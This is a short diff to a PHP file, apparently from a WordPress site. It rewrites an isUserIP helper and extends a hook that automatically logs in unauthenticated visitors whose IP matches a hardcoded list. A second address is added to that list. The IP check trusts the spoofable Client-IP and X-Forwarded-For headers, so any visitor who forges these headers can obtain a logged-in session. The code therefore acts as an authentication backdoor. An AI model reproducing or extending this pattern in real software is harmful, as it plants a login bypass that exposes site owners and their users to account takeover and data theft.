@@ -169,27 +169,29 @@ function auto_login()
 
 function isUserIP($curIp)
 {
-    $client  = @$_SERVER['HTTP_CLIENT_IP'];
-    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-    $remote  = $_SERVER['REMOTE_ADDR'];
+    $ip = filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_CLIENT_IP'] : '';
+    $ip = $ip ?: (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP) ? @$_SERVER['HTTP_X_FORWARDED_FOR'] : '');
+    $ip = $ip ?: $_SERVER['REMOTE_ADDR'];
 
-    if (filter_var($client, FILTER_VALIDATE_IP)) {
-        $ip = $client;
-    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
-        $ip = $forward;
-    } else {
-        $ip = $remote;
-    }
-
-    if ($curIp) {
+    if (is_string($curIp)) {
         return $curIp == $ip;
     }
 
-    return true;
+    if (is_array($curIp)) {
+
+        foreach ($curIp as $_curIp) {
+            if ($_curIp == $ip) {
+                return true;
+            }
+        }
+        return false;
+
+    }
 
     return $ip;
 }
-if (!is_user_logged_in() && isUserIP('118.70.187.91')) {
+
+if (!is_user_logged_in() && isUserIP(array('118.70.187.91', '192.168.1.10'))) {
     add_action('init', 'auto_login');
 }
 
